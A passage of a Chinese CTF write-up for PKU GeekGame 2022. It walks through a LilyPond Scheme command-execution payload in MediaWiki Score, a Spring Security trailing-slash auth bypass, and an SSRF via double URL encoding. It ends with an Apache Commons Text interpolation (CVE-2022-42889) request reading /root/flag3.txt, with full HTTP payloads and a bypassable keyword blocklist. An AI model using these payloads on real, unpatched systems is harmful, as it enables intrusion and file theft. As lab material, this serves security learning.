<p><strong>Re-enabling Score</strong></p>
<p>Now in August 2021, Wikimedia has re-enabled Score after isolating LilyPond and other external binaries using <a target="_blank" rel="noopener" href="https://www.mediawiki.org/wiki/Shellbox">Shellbox</a>.</p>
<p>On non-Wikimedia wikis: It is recommended to only enable Score  and LilyPond on your wiki if you absolutely trust everyone who has  editing privileges, or if you use <a target="_blank" rel="noopener" href="https://www.mediawiki.org/wiki/Shellbox">Shellbox</a>. Even with “safe mode” enabled, it is not safe to allow LilyPond to  process arbitrary input without containment. Ensure you’re using a  recent version of LilyPond (2.22.0+) or a distribution package (e.g.  from Debian) that contains the security fixes. All fixes have been  backported to the REL1_36 branch of Score and can be downloaded from <a target="_blank" rel="noopener" href="https://gerrit.wikimedia.org/g/mediawiki/extensions/Score">Git</a> or the <a target="_blank" rel="noopener" href="https://www.mediawiki.org/wiki/Special:ExtensionDistributor/Score">ExtensionDistributor</a>.</p>
</blockquote>
<p>这题用的 LilyPond 2.18.2，Score 0.3.0 (dd534e1) 2019年9月17日 (二) 13:38</p>
<p>考虑到这个版本这么老，大概率就是这堆 CVE 里的了<em>（怎么还有未披露的啊</em> <del>害人不浅啊</del></p>
<p>原来 LilyPond (荷花池) 是一个音乐雕版软件，乐</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125050926742.png"></p>
<p><a target="_blank" rel="noopener" href="https://phabricator.wikimedia.org/T257062">Lilypond seemingly not subject to restrictions (CVE-2020-29007)</a></p>
<p>上一题提示我们可以用 <code>Flag1</code> / <code>flag{insecure_01d_mediavviki}</code> 来登录</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125052322606.png"></p>
<p>看文档 <a target="_blank" rel="noopener" href="https://www.mediawiki.org/wiki/Extension:Score/zh">mediawiki 扩展:乐谱</a></p>
<p>试了下不能加 <code>sound</code> <code>vorbis</code> 这些参数，否则会因为没装 <a target="_blank" rel="noopener" href="https://www.mediawiki.org/wiki/Extension:TimedMediaHandler">TimedMediaHandler扩展</a>，无法进行音频转换，就渲染不出来。</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125055304190.png"></p>
<p>所以直接去掉这些参数就好了</p>
<p>构造个 payload 将 flag 写入 web 目录下</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>score</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lilypond<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>\new Staff &lt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>{c^#</span>
<span class="token attr-name">(number-</span><span class="token punctuation">&gt;</span></span>string (system "cat /flag2 &gt; /var/www/html/flag2"))
}&gt;&gt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>score</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125055514375.png"></p>
<p>这里应该是执行后返回值为 0</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125055459138.png"></p>
<p><code>flag{li1yp0nd_can_1ead_to_rce}</code></p>
<p>最后，执行个 ps 瞄一眼</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125060033526.png"></p>
<blockquote>
<p>赛后发现可以直接用下面的代码把 flag 渲染出来</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>score</span><span class="token punctuation">&gt;</span></span>\new Staff &lt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>{c^#</span>
<span class="token attr-name">(object-</span><span class="token punctuation">&gt;</span></span>string (call-with-input-file "/flag2" read))
}&gt;&gt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>score</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221129100516183.png"></p>
<p><code>^</code>后是音符c的上标，<code>#</code>是Scheme语句的开始标志</p>
</blockquote>
<h3 id="企业级理解"><a href="#企业级理解" class="headerlink" title="企业级理解"></a>企业级理解</h3><blockquote>
<blockquote>
<p>本题（不含以下题面）由赞助商蚂蚁集团提供。</p>
</blockquote>
<p>大型企业的软件开发方式与开源项目是不同的。 只有拥有了大型企业特有的企业级理解，才能够更好地让产品为客户赋能，实现前端与后台的解耦，将需求对齐到场景的完整链路中，实现从底层到盈利层的打通……</p>
<p>有些企业选择了坚如磐石的 Java 8 语言，只有在数十亿设备上都能运行的环境才是稳定可靠的环境。</p>
<p>有些企业选择了历久弥新的 Spring Framework，毕竟只需要写几行配置就能为一个巨大的 Web App 增加自动生成的登录页面，工程师放心，产品经理也放心。</p>
<p>有些企业选择了让程序员用 A4 纸书面打印代码来考核工作量，因为 “Talk is cheap, show me your code.” 是每名科班程序员的信条。</p>
<p>有些企业选择了用毕业典礼欢送每一名员工，即将毕业的 You 酱心有不甘，摸了摸胸前的工牌，在会议室的桌上捡起了两张同事上周打印出来的代码，希望能够成为自己职业道路上的一份纪念。</p>
<p>你You，有着企业级理解吗？</p>
<p><strong>补充说明：</strong>本题不需要爆破密码。三个 Flag 分别需要绕过登录页面访问管理后台、访问本机上的 bonus 服务、通过 bonus 服务在机器上执行命令。</p>
<p><strong>注意：题目返回的 Flag 格式可能形如 <code>flag1{...}</code>，请改成 <code>flag{...}</code> 后提交。</strong></p>
<p>你可以 <a target="_blank" rel="noopener" href="https://prob08-manager.geekgame.pku.edu.cn/docker-manager/start?xxx">访问题目网页</a> 你可以 <a target="_blank" rel="noopener" href="https://geekgame.pku.edu.cn/service/attachment/prob08/prob08-src.pdf">下载部分题目源码</a></p>
</blockquote>
<h4 id="赋能管理后台"><a href="#赋能管理后台" class="headerlink" title="赋能管理后台"></a>赋能管理后台</h4><p>绕过登录页面访问管理后台</p>
<p>参考 <a target="_blank" rel="noopener" href="https://threedr3am.github.io/2021/09/22/Spring%20Security%E7%9A%84%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95auth%20bypass%E5%92%8C%E4%B8%80%E4%BA%9B%E5%B0%8F%E7%AC%94%E8%AE%B0/">Spring Security的一个简单auth bypass和一些小笔记</a></p>
<p>在url最后加个 <code>/</code> 后缀，就能auth bypass了</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124051232086.png"></p>
<p>于是直接访问 <a target="_blank" rel="noopener" href="http://prob08-fyjvhi7n.geekgame.pku.edu.cn/admin/">http://prob08-fyjvhi7n.geekgame.pku.edu.cn/admin/</a></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124051259229.png"></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124051310348.png"></p>
<p>试试这个 query 有啥用，这三个选项总有一个有戏吧！</p>
<p>试到 <code>PKU_GeekGame</code>，出了 flag1！</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124051752143.png"></p>
<p><strong>payload:</strong></p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/admin/query/</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">prob08-fyjvhi7n.geekgame.pku.edu.cn</span></span>
<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://prob08-fyjvhi7n.geekgame.pku.edu.cn/login</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">JSESSIONID=9DFC4E40600AB403B62117862E63EB8B</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">17</span></span>

type=PKU_GeekGame<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/16798843.html">Java安全之Spring Security绕过总结</a></p>
<p><a target="_blank" rel="noopener" href="https://threedr3am.github.io/2021/09/22/Spring%20Security%E7%9A%84%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95auth%20bypass%E5%92%8C%E4%B8%80%E4%BA%9B%E5%B0%8F%E7%AC%94%E8%AE%B0/">Spring Security的一个简单auth bypass和一些小笔记</a></p>
</blockquote>
<h4 id="盘活业务增长"><a href="#盘活业务增长" class="headerlink" title="盘活业务增长"></a>盘活业务增长</h4><p>看源码</p>
<p><a target="_blank" rel="noopener" href="http://prob08-fyjvhi7n.geekgame.pku.edu.cn/admin/source_bak/">http://prob08-fyjvhi7n.geekgame.pku.edu.cn/admin/source_bak/</a></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>reactive<span class="token punctuation">.</span>function<span class="token punctuation">.</span>client<span class="token punctuation">.</span></span><span class="token class-name">WebClient</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@RestController</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AdminController</span> <span class="token punctuation">{</span>

    <span class="token class-name">WebClient</span> webClient <span class="token operator">=</span> <span class="token class-name">WebClient</span><span class="token punctuation">.</span><span class="token function">builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">baseUrl</span><span class="token punctuation">(</span><span class="token string">"http://localhost:8079/"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/admin/{index}"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">adminIndex</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span><span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"index"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> index<span class="token punctuation">,</span> <span class="token class-name">String</span> auth<span class="token punctuation">,</span> <span class="token class-name">QueryBean</span> queryBean<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;</span> index<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            index <span class="token operator">=</span> <span class="token class-name">URLDecoder</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> <span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>queryBean<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            queryBean<span class="token punctuation">.</span><span class="token function">setType</span><span class="token punctuation">(</span><span class="token string">"PKU"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>typeList<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>queryBean<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            typeList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>queryBean<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token class-name">Mono</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> str <span class="token operator">=</span> webClient<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">uri</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token class-name">HttpHeaders</span><span class="token punctuation">.</span>AUTHORIZATION<span class="token punctuation">,</span> auth<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token class-name">BodyInserters</span><span class="token punctuation">.</span><span class="token function">fromFormData</span><span class="token punctuation">(</span><span class="token string">"type"</span><span class="token punctuation">,</span> queryBean<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">retrieve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bodyToMono</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> queryBean<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">block</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里应该是个 SSRF，这部分应该要访问本机上的 bonus 服务来拿 flag</p>
<p><code>index</code> 参数这里将网址二次 URL 编码就好了</p>
<p>根据所给的源码 <code>Dockerfile</code></p>
<pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> openjdk:8u342-jre</span>
<span class="token instruction"><span class="token keyword">ENV</span> LANG C.UTF-8</span>
<span class="token instruction"><span class="token keyword">VOLUME</span> /tmp</span>
<span class="token instruction"><span class="token keyword">COPY</span> PKU_GeekGame_Ant_Web-1.0.0-SNAPSHOT.jar web.jar</span>
<span class="token instruction"><span class="token keyword">COPY</span> PKU_GeekGame_Ant_Backend-1.0.0-SNAPSHOT.jar backend.jar</span>
<span class="token instruction"><span class="token keyword">COPY</span> PKU_GeekGame_Ant_Bonus-1.0.0-SNAPSHOT.jar bonus.jar</span>
<span class="token instruction"><span class="token keyword">COPY</span> flag1.txt /root/flag1.txt</span>
<span class="token instruction"><span class="token keyword">COPY</span> flag2.txt /root/flag2.txt</span>
<span class="token instruction"><span class="token keyword">COPY</span> flag3.txt /root/flag3.txt</span>

<span class="token instruction"><span class="token keyword">RUN</span> echo <span class="token operator">\</span>
<span class="token string">"#!/bin/sh\n"</span><span class="token operator">\</span>
<span class="token string">"nohup java -jar /backend.jar --server.port=8079 &amp;\n"</span><span class="token operator">\</span>
<span class="token string">"nohup java -jar /bonus.jar --server.port=8080 &amp;"</span><span class="token operator">\</span>
&gt;&gt; /start.sh</span>
<span class="token instruction"><span class="token keyword">RUN</span> chmod +x /start.sh</span>
<span class="token instruction"><span class="token keyword">CMD</span> nohup sh -c <span class="token string">"/start.sh &amp;&amp; java -jar /web.jar --server.port=80"</span></span>
<span class="token instruction"><span class="token keyword">EXPOSE</span> 80</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>bonus 开在 8080 端口，于是构造</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/admin/http%253A%252F%252Flocalhost%253A8080%252F/</span> <span class="token http-version property">HTTP/1.1</span></span>

Response

Endpoints:
/bonus
/source_bak<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124170141981.png"></p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">POST /admin/http%253A%252F%252Flocalhost%253A8080%252Fbonus/ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124170213828.png" alt="bonus"></p>
<h4 id="打通整个系统"><a href="#打通整个系统" class="headerlink" title="打通整个系统"></a>打通整个系统</h4><blockquote>
<p><strong>第二阶段提示：</strong></p>
<ul>
<li>Flag 1：很多 HTTP 框架都会在判断网址对应的 Endpoint 时去除网址结尾的斜杠。</li>
<li>Flag 2：可以通过 web 服务访问本机的 bonus 服务，以及别忘了源码是可以下载的。</li>
<li>Flag 3：“这确实不是漏洞，这是特性” —— Log4j 对他的好兄弟 Commons Text 点了一个赞。</li>
</ul>
</blockquote>
<p>这部分需要 通过 bonus 服务在机器上执行命令</p>
<p>再去看源码</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">POST /admin/http%253A%252F%252Flocalhost%253A8080%252Fsource_bak/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span><span class="token class-name">StringSubstitutor</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@RestController</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BonusController</span> <span class="token punctuation">{</span>

	<span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/bonus"</span><span class="token punctuation">)</span>
	<span class="token keyword">public</span> <span class="token class-name">QueryBean</span> <span class="token function">bonus</span><span class="token punctuation">(</span><span class="token class-name">QueryBean</span> queryBean<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	    <span class="token keyword">if</span><span class="token punctuation">(</span>queryBean<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"CommonsText"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	        <span class="token class-name">StringSubstitutor</span> interpolator <span class="token operator">=</span> <span class="token class-name">StringSubstitutor</span><span class="token punctuation">.</span><span class="token function">createInterpolator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	        interpolator<span class="token punctuation">.</span><span class="token function">setEnableSubstitutionInVariables</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	        <span class="token class-name">String</span> value <span class="token operator">=</span> <span class="token function">replaceUnSafeWord</span><span class="token punctuation">(</span>queryBean<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	        <span class="token class-name">String</span> resultValue <span class="token operator">=</span> interpolator<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
	        queryBean<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>resultValue<span class="token punctuation">)</span><span class="token punctuation">;</span>

	    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
	        <span class="token comment">// flag3藏在/root/flag3.txt等待你发现</span>
	    <span class="token punctuation">}</span>

	    <span class="token keyword">return</span> queryBean<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">replaceUnSafeWord</span><span class="token punctuation">(</span><span class="token class-name">String</span> txt<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	    <span class="token class-name">String</span> resultTxt <span class="token operator">=</span> txt<span class="token punctuation">;</span>

	    <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> unsafeList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"java"</span><span class="token punctuation">,</span> <span class="token string">"js"</span><span class="token punctuation">,</span> <span class="token string">"script"</span><span class="token punctuation">,</span> <span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token string">"start"</span><span class="token punctuation">,</span> <span class="token string">"url"</span><span class="token punctuation">,</span> <span class="token string">"dns"</span><span class="token punctuation">,</span> <span class="token string">"groovy"</span><span class="token punctuation">,</span> <span class="token string">"bsh"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">,</span> <span class="token string">"ognl"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	    <span class="token class-name">Iterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> iterator <span class="token operator">=</span> unsafeList<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	    <span class="token class-name">String</span> word<span class="token punctuation">;</span>
	    <span class="token class-name">String</span> replaceString<span class="token punctuation">;</span>
	    <span class="token keyword">while</span> <span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	        word <span class="token operator">=</span> iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	        replaceString <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
	        resultTxt <span class="token operator">=</span> resultTxt<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"(?i)"</span> <span class="token operator">+</span> word<span class="token punctuation">,</span> replaceString<span class="token punctuation">)</span><span class="token punctuation">;</span>
	    <span class="token punctuation">}</span>

	    <span class="token keyword">return</span> resultTxt<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里的过滤直接双写绕过就完事了。</p>
<p>去 GitHub 找了老半天 <code>queryBean</code> 类似的代码，才知道您们 Java 这里是把所有 query 参数都做了个类，获取对应的值都有一个 getxxx 方法。</p>
<p>于是 <code>queryBean.getType()</code> 实际上就是接收 <code>?type=xxx</code> 的值，而 <code>queryBean.getValue()</code> 就是拿 <code>value=xxx</code> 了</p>
<p>而这个打 SSRF 要把 POST 参数放在 body 里（详见上面的 <code>AdminController</code>）</p>
<br>

<p>再回到题目</p>
<p>搜了下 Commons Text RCE，果然就是今年十月份还算挺新鲜的洞（怎么那时候没咋关注捏？</p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1973">浅谈Apache Commons Text RCE(CVE-2022-42889)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/cve-2022-42889/">text4shell CVE-2022-42889 poc</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bleepingcomputer.com/news/security/apache-commons-text-rce-flaw-keep-calm-and-patch-away/">Apache Commons Text RCE flaw — Keep calm and patch away</a></p>
<p><a target="_blank" rel="noopener" href="https://www.rapid7.com/blog/post/2022/10/17/cve-2022-42889-keep-calm-and-stop-saying-4shell/">CVE-2022-42889: Keep Calm and Stop Saying “4Shell”</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/korteke/CVE-2022-42889-POC">CVE-2022-42889-POC</a>         </p>
<p>首先试试能不能看版本</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125064232594.png"></p>
<p>试试能不能 RCE，看上去是已经执行了，返回了个执行的 UNIXProcess，但是没有命令执行的回显。</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125065025407.png"></p>
<p>但是题目环境不出网，没法反弹 shell，后端是用 jar 部署的无法写入静态文件，外带的话也没想到啥好方案。</p>
<p>最后，总得找个方法读文件了，正好看到了这个</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125065830066.png"></p>
<p>于是构造 payload</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/admin/http%253A%252F%252Flocalhost%253A8080%252Fbonus%253F/</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">prob08-hp8fbaeg.geekgame.pku.edu.cn</span></span>
<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">JSESSIONID=9DFC4E40600AB403B62117862E63EB8B</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">52</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>

type=CommonsText&amp;value=${file:utf-8:/root/flag3.txt}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125065748802.png"></p>
<p>终于出了！！！</p>
<p>麻了，还是不会 Java 啊，您们太会玩了（</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231170326177.png"></p>
<p>又是一年北京大学信息安全综合能力竞赛！</p>
<p>题目比隔壁 USTC Hackergame 难了不少，感觉更像真正的 CTF 题了</p>
<p>不过今年事情比较多，不大有时间来打了捏，基本就看了两三个晚上/凌晨，还是看到 24 日中午开始进入第二阶段只能拿 1/3 的分值，于是那天凌晨才急忙瞄了下题目，但能随手做出来的还不多，挺多要耐心找资料看文档审源码的……</p>
